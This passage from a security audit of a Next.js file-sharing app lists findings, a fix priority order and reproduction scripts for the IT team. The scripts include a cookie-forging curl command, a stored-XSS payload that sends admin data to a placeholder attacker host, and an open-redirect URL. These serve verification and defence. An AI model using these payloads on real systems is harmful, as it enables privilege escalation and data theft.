4. **`.env` is on disk and contains dev tokens in this sandbox.** The local `.env` has predictable tokens like `"local-dev-admin-token-not-for-production-1234567890abcdef"`. These are checked in to the sandbox but not to git. If a similar pattern ever leaks to production (e.g. someone copies the dev `.env` instead of generating fresh tokens), the entire auth model is broken in two ways at once.
5. **`encodeURIComponent` is used in the `Content-Disposition: filename=...` header** (good — prevents header injection), but the underlying `file.originalName` is *not* validated to be a "safe" filename. If the original filename contains a backslash or quote, `encodeURIComponent` will escape it but the resulting header is `filename="evil%22name"`. Most browsers will display this verbatim, so the user sees `evil"name`. Cosmetic, not security.
6. **`safeJoin` is open-coded in three different files** (`src/app/api/files/[id]/route.js:20-25`, `src/app/api/admin/programmes/[id]/route.js:15-20`, `src/app/api/admin/programmes/[id]/files/route.js:20-25`, `src/app/api/admin/programmes/[id]/files/[fileId]/route.js:10-15`). Four copies of the same logic. The risk is that the next person who needs `safeJoin` writes it slightly differently (e.g. uses `===` instead of `startsWith`, or forgets the path.sep on Windows). Centralise it in `src/lib/safeJoin.js`.
7. **The dev `npm run dev` output in this sandbox showed a CSP-style `EvalError: Code generation from strings disallowed for this context`** (from middleware). This is a sandbox-specific issue (the sandbox uses `node --experimental-vm-modules` or similar), not a code issue. IT's production Node won't hit it. Worth flagging only because the user may see the same message in their own setup.

---

## Reproduction scripts (for the IT team to re-verify)

### Verify the cookie-forge (C-1)
```bash
# After deploying, with no ADMIN_TOKEN/VIEW_TOKEN in your hand:
printf "#HttpOnly_your.host\tFALSE\t/\tTRUE\t9999999999\tpp_role\tadmin\n" > /tmp/forged.txt
curl -s -b /tmp/forged.txt https://your.host/admin
# Expected after fix: 307 to /login (i.e. the forged cookie is rejected).
# Currently: 200 OK.
```

### Verify the XSS via uploaded HTML (H-1)
```bash
# As admin:
printf '<script>fetch("/api/admin/programmes").then(r=>r.json()).then(j=>fetch("//evil.example.com/x?d="+JSON.stringify(j)))</script>' > /tmp/x.html
curl -s -b "$ADMIN_COOKIE" -X POST \
  -F "file=@/tmp/x.html;filename=recap.html;type=text/html" \
  -F "category=ARTICLE" \
  https://your.host/api/admin/programmes/<any-prog-id>/files
# Note the file id in the response.

# As viewer, in a browser: visit https://your.host/api/files/<id>
# Expected after fix: file downloads, no script execution.
# Currently: page renders the HTML, the script fires.
```

### Verify the 500s (H-2)
```bash
curl -s -b "$ADMIN_COOKIE" -X PATCH -H "Content-Type: application/json" \
  -d '{"name":12345}' \
  https://your.host/api/admin/programmes/<id>
# Expected after fix: 400 {"error":"name must be a string"}.
# Currently: 500, empty body, stack trace in server log.

# Race:
for i in $(seq 1 10); do
  curl -s -b "$ADMIN_COOKIE" -X POST -H "Content-Type: application/json" \
    -d '{"name":"RaceTest","level":"L1","pathway":"ROBOTICS_ENGINEERING"}' \
    https://your.host/api/admin/programmes &
done; wait
# Expected after fix: 1× 201, 9× 409 (or similar).
# Currently: 1× 201, 8× 400, 1× 500.
```

### Verify the open redirect (M-1)
```bash
# In a browser, visit:
https://your.host/login?next=https://evil.example.com/fake-login
# Log in. After login, you should land on /admin (or /).
# Expected after fix: land on /admin.
# Currently: land on https://evil.example.com/fake-login.
```

### Verify the security headers (M-4)
```bash
curl -sI https://your.host/login
# Expected: X-Content-Type-Options, X-Frame-Options, Referrer-Policy, etc.
# Currently: only Cache-Control, Content-Type, X-Powered-By, Vary, Date.
```

---

## What I did *not* find

- No SQL injection (Prisma is parameterised throughout).
- No path traversal in file storage or serving.
- No `dangerouslySetInnerHTML`, no `eval`, no untrusted HTML rendering.
- No SSRF via the URL validator (it correctly rejects `javascript:`, `data:`, `file://`).
- No leaked secrets in git (`.env` is in `.gitignore`).
- No IDOR on the per-programme file routes (the `file.programmeId !== id` check at `src/app/api/admin/programmes/[id]/files/[fileId]/route.js:24` is correct).
- No CORS allow-origin set (good).
- No state-changing GET endpoints (good for CSRF, even before considering the cookie issue).
- No 401/404 information disclosure for `/api/files/[id]` (the 401 is returned for any id, authenticated or not, before the DB lookup).

---

## Suggested fix priority for IT

Before deploy:
1. **C-1** — sign the cookie. (This is the only blocker that allows a one-step privilege escalation.)
2. **H-1** — sanitize MIME types + force `attachment` + add `nosniff`. (Stored XSS.)
3. **H-2** — wrap route handlers in top-level try/catch + type-check inputs + fix the TOCTOU. (Prevents log noise and one class of 500.)
4. **M-4** — add security headers via `next.config.mjs`. (One config file change.)

Soon after deploy:
5. **H-3** — switch to `crypto.timingSafeEqual`. (One line.)
6. **M-1** — validate `next` in `LoginForm.jsx`. (One line.)
7. **H-4** — `SameSite=Strict` or add an Origin check. (One line.)
8. **L-2** — add a Vitest test suite. (Half a day of work; catches all of the above on the next change.)

Nice to have:
9. **M-2** — gate file access by category. (Five lines.)
10. **M-6** — validate `BASE_PATH`. (Five lines in `config.js`.)
11. **L-1, L-3, L-4, L-5, L-6** — defense in depth.
